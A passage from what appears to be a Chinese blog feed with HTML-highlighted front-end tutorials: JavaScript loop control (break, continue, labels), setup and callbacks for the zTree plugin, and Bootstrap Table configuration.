class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    i++;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;x);</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure></div><h4 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a>break语句和continue语句</h4><blockquote><p><strong>break和continue都具有跳转的作用。</strong></p></blockquote><p><strong>break语句用于跳转代码块或者循环。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">20</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"循环的次数："</span>+i);</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i===<span class="number">10</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> j = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;j;i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"当前的i值为："</span>+i);</span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">10</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>continue是立即停止本轮循环，跳转到循环的头部，执行下一次循环。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">100</span>)&#123;</span><br><span class="line">  i++;</span><br><span class="line">  <span class="keyword">if</span> (i % <span class="number">2</span> === <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'i 当前为：'</span> + i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>上面的代码只有i的值为奇数时才会输入，为偶数的时候执行下一轮循环。</strong></p><h4 id="标签-label"><a href="#标签-label" class="headerlink" title="标签(label)"></a>标签(label)</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">label:</span><br><span class="line">代码块</span><br></pre></td></tr></table></figure></div><p><strong>标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。</strong></p><p><strong>标签通常与break和continue语句配合使用，跳出特定循环。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">top:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (i === <span class="number">1</span> &amp;&amp; j === <span class="number">1</span>) <span class="keyword">break</span> top;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'i='</span> + i + <span class="string">', j='</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// i=0, j=0</span></span><br><span class="line"><span class="comment">// i=0, j=1</span></span><br><span class="line"><span class="comment">// i=0, j=2</span></span><br><span class="line"><span class="comment">// i=1, j=0</span></span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">top:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (i === <span class="number">1</span> &amp;&amp; j === <span class="number">1</span>) <span class="keyword">continue</span> top;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'i='</span> + i + <span class="string">', j='</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// i=0, j=0</span></span><br><span class="line"><span class="comment">// i=0, j=1</span></span><br><span class="line"><span class="comment">// i=0, j=2</span></span><br><span class="line"><span class="comment">// i=1, j=0</span></span><br><span class="line"><span class="comment">// i=2, j=0</span></span><br><span class="line"><span class="comment">// i=2, j=1</span></span><br><span class="line"><span class="comment">// i=2, j=2</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zTree 文件树</title>
      <link href="/2019/06/03/ztree-wen-jian-shu/"/>
      <url>/2019/06/03/ztree-wen-jian-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="zTree-文件树"><a href="#zTree-文件树" class="headerlink" title="zTree 文件树"></a>zTree 文件树</h1><h2 id="zTree简介"><a href="#zTree简介" class="headerlink" title="zTree简介"></a>zTree简介</h2><blockquote><h4 id="zTree-是一个依靠-jQuery-实现的多功能-“树插件”。优异的性能、灵活的配置、多种功能的组合是-zTree-最大优点。"><a href="#zTree-是一个依靠-jQuery-实现的多功能-“树插件”。优异的性能、灵活的配置、多种功能的组合是-zTree-最大优点。" class="headerlink" title="zTree 是一个依靠 jQuery 实现的多功能 “树插件”。优异的性能、灵活的配置、多种功能的组合是 zTree 最大优点。"></a>zTree 是一个依靠 jQuery 实现的多功能 “树插件”。优异的性能、灵活的配置、多种功能的组合是 zTree 最大优点。</h4></blockquote><p><strong>这当然是官方给的说法，不过我也是这么觉得。当你使用了会发现还是很有趣的。</strong></p><h2 id="运用场景"><a href="#运用场景" class="headerlink" title="运用场景"></a>运用场景</h2><p>运用场景其实并不广泛，一般在后台管理页面出现的身影比较多。简单的结构我们都是悬着表格来展现。像文件浏览，资产管理，权限管理就可以看到它的身影了。</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><p>在官网很多实例我们下载文件时都有，我们可以查看他们是如何实现的。</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/metroStyle/metroStyle.css"</span>&gt;</span>   //metro风格</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.ztree.all.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">请不要忘记了加载jQuery。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-1 modal-content"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"regionZTree"</span> <span class="attr">class</span>=<span class="string">"ztree"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="自定义Js"><a href="#自定义Js" class="headerlink" title="自定义Js"></a>自定义Js</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">zTreeObj = $.fn.zTree.init($(<span class="string">"#regionZTree"</span>), setting, treelist);</span><br><span class="line"><span class="keyword">var</span> setting = &#123;</span><br><span class="line">    view: &#123;</span><br><span class="line">        addHoverDom: addHoverDom,   <span class="comment">//添加创建文件夹按钮</span></span><br><span class="line">        removeHoverDom: removeHoverDom,    <span class="comment">//去除创建文件夹按钮</span></span><br><span class="line">        dblClickExpand: <span class="literal">false</span>,<span class="comment">//双击节点时，是否自动展开父节点的标识</span></span><br><span class="line">        showLine: <span class="literal">true</span>,<span class="comment">//是否显示节点之间的连线</span></span><br><span class="line">        fontCss:&#123;<span class="string">'color'</span>:<span class="string">'black'</span>,<span class="string">'font-weight'</span>:<span class="string">'bold'</span>&#125;,<span class="comment">//字体样式函数</span></span><br><span class="line">        selectedMulti: <span class="literal">true</span> <span class="comment">//设置是否允许同时选中多个节点</span></span><br><span class="line">    &#125;,</span><br><span class="line">    check:&#123;</span><br><span class="line">        <span class="comment">//chkboxType: &#123; "Y": "ps", "N": "ps" &#125;,</span></span><br><span class="line">        chkboxType: &#123; <span class="string">"Y"</span>: <span class="string">""</span>, <span class="string">"N"</span>: <span class="string">""</span> &#125;,</span><br><span class="line">        chkStyle: <span class="string">"checkbox"</span>,<span class="comment">//复选框类型</span></span><br><span class="line">        enable: <span class="literal">false</span> <span class="comment">//每个节点上是否显示 CheckBox</span></span><br><span class="line">    &#125;,</span><br><span class="line">    edit:&#123;</span><br><span class="line">        enable: <span class="literal">true</span>,</span><br><span class="line">        editNameSelectAll: <span class="literal">false</span>,</span><br><span class="line">        showRemoveBtn : <span class="literal">false</span>,</span><br><span class="line">        showRenameBtn : <span class="literal">false</span>,</span><br><span class="line">        removeTitle : <span class="string">"remove"</span>,</span><br><span class="line">        renameTitle : <span class="string">"rename"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data: &#123;</span><br><span class="line">        simpleData: &#123;<span class="comment">//简单数据模式</span></span><br><span class="line">            enable:<span class="literal">true</span>,</span><br><span class="line">            idKey: <span class="string">"id"</span>,</span><br><span class="line">            pIdKey: <span class="string">"IPARENTID"</span>,</span><br><span class="line">            rootPId: <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    callback: &#123;</span><br><span class="line">        <span class="comment">// beforeExpand:zTreeBeforeExpand, // 用于捕获父节点展开之前的事件回调函数，并且根据返回值确定是否允许展开操作</span></span><br><span class="line">        beforeRightClick: zTreeBeforeRightClick,  <span class="comment">//用于捕获 zTree 上鼠标右键点击之前的事件回调函数，并且根据返回值确定触发 onRightClick 事件回调函数</span></span><br><span class="line">        onClick: Spanningtree, <span class="comment">//用于捕获节点被点击的事件回调函数</span></span><br><span class="line">        onRightClick: Downtreefile,   <span class="comment">//用于捕获 zTree 上鼠标右键点击之后的事件回调函数</span></span><br><span class="line">        onDrop: Throwfile,   <span class="comment">//用于捕获节点拖拽操作结束的事件回调函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h2 id="zTree解析"><a href="#zTree解析" class="headerlink" title="zTree解析"></a>zTree解析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zTreeObj = $.fn.zTree.init($("#regionZTree"), setting, treelist); </span><br><span class="line">//第一个参数是我需要显示tree的地方，第二个参数时我们针对tree的设置，第三个参数时数据源</span><br></pre></td></tr></table></figure></div><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>从上面可以看到我们还需要传入一个参数treelist。那treelist具体是什么一个形式呢？</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodes = [</span><br><span class="line">&#123;<span class="attr">name</span>: <span class="string">"父节点1"</span>, <span class="attr">children</span>: [</span><br><span class="line">&#123;<span class="attr">name</span>: <span class="string">"子节点1"</span>&#125;,</span><br><span class="line">&#123;<span class="attr">name</span>: <span class="string">"子节点2"</span>&#125;</span><br><span class="line">]&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodes = [</span><br><span class="line">&#123;<span class="attr">id</span>:<span class="number">1</span>, <span class="attr">pId</span>:<span class="number">0</span>, <span class="attr">name</span>: <span class="string">"父节点1"</span>&#125;,</span><br><span class="line">&#123;<span class="attr">id</span>:<span class="number">11</span>, <span class="attr">pId</span>:<span class="number">1</span>, <span class="attr">name</span>: <span class="string">"子节点1"</span>&#125;,</span><br><span class="line">&#123;<span class="attr">id</span>:<span class="number">12</span>, <span class="attr">pId</span>:<span class="number">1</span>, <span class="attr">name</span>: <span class="string">"子节点2"</span>&#125;</span><br><span class="line">];</span><br><span class="line">简单模式的 <span class="built_in">JSON</span> 数据需要使用 id / pId 表示节点的父子包含关系.</span><br></pre></td></tr></table></figure></div><p><strong>个人比较中意第一种，因为这个就像json一样，首先我们也方便构造，也很直观可以看清父子的关系。</strong></p><h3 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h3><blockquote><h5 id="具体的setting请查看官方的API文档。"><a href="#具体的setting请查看官方的API文档。" class="headerlink" title="具体的setting请查看官方的API文档。"></a>具体的setting请查看官方的API文档。</h5></blockquote><ul><li><p>view(视图类)</p><p>视图相关的设置。这个也类似键值对，你只需要知道Key的使用方法，value则是自定的方法名。</p></li><li><p>callback(回调机制)</p></li></ul><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zTreeOnClick</span>(<span class="params">event, treeId, treeNode</span>) </span>&#123;</span><br><span class="line">    alert(treeNode.tId + <span class="string">", "</span> + treeNode.name);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> setting = &#123;</span><br><span class="line">callback: &#123;</span><br><span class="line">onClick: zTreeOnClick</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><ul><li><p><strong>event</strong></p><p><strong>记录触发的事件</strong></p></li><li><p><strong>treeId</strong></p><p><strong>触发的treeid</strong></p></li><li><p><strong>treeNode</strong></p><p><strong>这个将记录我们传入的文件数据。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ztree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap Table</title>
      <link href="/2019/06/03/bootstrap-table/"/>
      <url>/2019/06/03/bootstrap-table/</url>
      
        <content type="html"><![CDATA[<h1 id="Bootstrap-Table"><a href="#Bootstrap-Table" class="headerlink" title="Bootstrap Table"></a>Bootstrap Table</h1><h2 id="一，什么是Bootstrap-Table"><a href="#一，什么是Bootstrap-Table" class="headerlink" title="一，什么是Bootstrap Table"></a>一，什么是Bootstrap Table</h2><p><strong>其实从英文翻译就得知了，是一款Bootstrap的表格插件。</strong></p><p><strong>Bootstrap Table可用快速的建表，查询，分页，排序，等一系列功能。</strong></p><h2 id="二，Bootstrap-Table模式"><a href="#二，Bootstrap-Table模式" class="headerlink" title="二，Bootstrap Table模式"></a>二，Bootstrap Table模式</h2><blockquote><p>Boostatrp Table分为两种模式：客户端(client)模式,服务端(server)模式。</p></blockquote><ul><li><p><strong>客户端</strong></p><p><strong>通过数据接口将服务器需要加载的数据一次性展现出来，然后装换成Json然后生成table。我们可以自己定义显示行数，分页等。此时就不再会向服务器发送请求了。</strong></p></li><li><p><strong>服务器</strong></p><p><strong>根据设定的每页记录数和当前显示页，发送数据到服务器进行查询。</strong></p></li></ul><h2 id="三，Bootstrap-Table使用"><a href="#三，Bootstrap-Table使用" class="headerlink" title="三，Bootstrap Table使用"></a>三，Bootstrap Table使用</h2><h4 id="下载插件Bootstrap-Table"><a href="#下载插件Bootstrap-Table" class="headerlink" title="下载插件Bootstrap Table"></a>下载插件<a href="https://bootstrap-table.com/" target="_blank" rel="noopener">Bootstrap Table</a></h4><h4 id="引用插件"><a href="#引用插件" class="headerlink" title="引用插件"></a>引用插件</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap-table.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap-table.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap-table-zh-CN.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    //中文表格不乱码</span><br></pre></td></tr></table></figure></div><p><strong>自定义JS</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $newtable;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InitMainTable</span>(<span class="params">data</span>) </span>&#123;    </span><br><span class="line">    <span class="comment">// console.log(data);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.operateEvents = &#123;</span><br><span class="line">        <span class="string">'click .download'</span>: <span class="function"><span class="keyword">function</span> (<span class="params">e,value,row,index</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(row);</span><br><span class="line">xxx();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $newtable = $(<span class="string">'#tb_departments'</span>).bootstrapTable(&#123;</span><br><span class="line">        <span class="comment">// url: '/Home/GetDepartment',         //请求后台的URL（*）</span></span><br><span class="line">        <span class="comment">// method: 'get',                      //请求方式（*）</span></span><br><span class="line">        data: data,</span><br><span class="line">        silent: <span class="literal">true</span>,</span><br><span class="line">        toolbar: <span class="string">'#toolbar'</span>,                <span class="comment">//工具按钮用哪个容器</span></span><br><span class="line">        striped: <span class="literal">true</span>,                      <span class="comment">//是否显示行间隔色</span></span><br><span class="line">        cache: <span class="literal">false</span>,                       <span class="comment">//是否使用缓存，默认为true，所以一般情况下需要设置一下这个属性（*）</span></span><br><span class="line">        pagination: <span class="literal">true</span>,                   <span class="comment">//是否显示分页（*）</span></span><br><span class="line">        sortable: <span class="literal">false</span>,                     <span class="comment">//是否启用排序</span></span><br><span class="line">        sortOrder: <span class="string">"asc"</span>,                   <span class="comment">//排序方式</span></span><br><span class="line">        queryParams: <span class="function"><span class="keyword">function</span> (<span class="params">params</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> temp = &#123;   <span class="comment">//这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的</span></span><br><span class="line">                limit: params.limit,   <span class="comment">//页面大小</span></span><br><span class="line">                offset: params.offset,  <span class="comment">//页码s</span></span><br><span class="line">                search: $(<span class="string">'#productLine'</span>).val()</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="built_in">console</span>.log(temp);</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;,<span class="comment">//传递参数（*）</span></span><br><span class="line">        sidePagination: <span class="string">"client"</span>,           <span class="comment">//分页方式：client客户端分页，server服务端分页（*）</span></span><br><span class="line">        pageNumber:<span class="number">1</span>,                       <span class="comment">//初始化加载第一页，默认第一页</span></span><br><span class="line">        pageSize: <span class="number">6</span>,                       <span class="comment">//每页的记录行数（*）</span></span><br><span class="line">        pageList: [<span class="number">10</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">100</span>],        <span class="comment">//可供选择的每页的行数（*）</span></span><br><span class="line">        search: <span class="literal">true</span>,                       <span class="comment">//是否显示表格搜索，此搜索是客户端搜索，不会进服务端，所以，个人感觉意义不大</span></span><br><span class="line">        strictSearch: <span class="literal">true</span>,</span><br><span class="line">        showColumns: <span class="literal">true</span>,                  <span class="comment">//是否显示所有的列</span></span><br><span class="line">        showRefresh: <span class="literal">true</span>,                  <span class="comment">//是否显示刷新按钮</span></span><br><span class="line">        minimumCountColumns: <span class="number">2</span>,             <span class="comment">//最少允许的列数</span></span><br><span class="line">        clickToSelect: <span class="literal">true</span>,                <span class="comment">//是否启用点击选中行</span></span><br><span class="line">        height: <span class="number">500</span>,                        <span class="comment">//行高，如果没有设置height属性，表格自动根据记录条数觉得表格高度</span></span><br><span class="line">        uniqueId: <span class="string">"ID"</span>,                     <span class="comment">//每一行的唯一标识，一般为主键列</span></span><br><span class="line">        showToggle:<span class="literal">true</span>,                    <span class="comment">//是否显示详细视图和列表视图的切换按钮</span></span><br><span class="line">        cardView: <span class="literal">false</span>,                    <span class="comment">//是否显示详细视图</span></span><br><span class="line">        detailView: <span class="literal">false</span>,                   <span class="comment">//是否显示父子表</span></span><br><span class="line">        showExport: <span class="literal">true</span>,                     <span class="comment">//是否显示导出</span></span><br><span class="line">        exportDataType: <span class="string">"basic"</span>,              <span class="comment">//basic', 'all', 'selected'.</span></span><br><span class="line">        columns: [&#123;</span><br><span class="line">            checkbox: <span class="literal">true</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            field: <span class="string">'Key'</span>, <span class="attr">title</span>: <span class="string">'文件路径'</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            field: <span class="string">'Size'</span>, <span class="attr">title</span>: <span class="string">'文件大小'</span></span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            field: <span class="string">'X_COS_META_TAG1'</span>, <span class="attr">title</span>: <span class="string">'标签#1'</span> , <span class="attr">formatter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">value, row, index</span>) </span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            field: <span class="string">'notice'</span>, <span class="attr">title</span>: <span class="string">'备注'</span></span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            field: <span class="string">'Button'</span>,<span class="attr">title</span>:<span class="string">"操作"</span>,<span class="attr">align</span>: <span class="string">'center'</span>,<span class="attr">events</span>:operateEvents,<span class="attr">formatter</span>:<span class="function"><span class="keyword">function</span>(<span class="params">value,row,index</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> download = <span class="string">'&lt;button type="button" class="btn btn-danger download"&gt;下载&lt;/button&gt;'</span></span><br><span class="line">                <span class="keyword">return</span> download;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    ]</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>上面的注释其实已经很清楚明了了。我把它写成了一个函数的形式。这个根据自己的情况而定。我是为了需要复用的时候只需要调用函数就可以了。</strong></p><h2 id="Bootstrap-Table拆解"><a href="#Bootstrap-Table拆解" class="headerlink" title="Bootstrap Table拆解"></a>Bootstrap Table拆解</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span 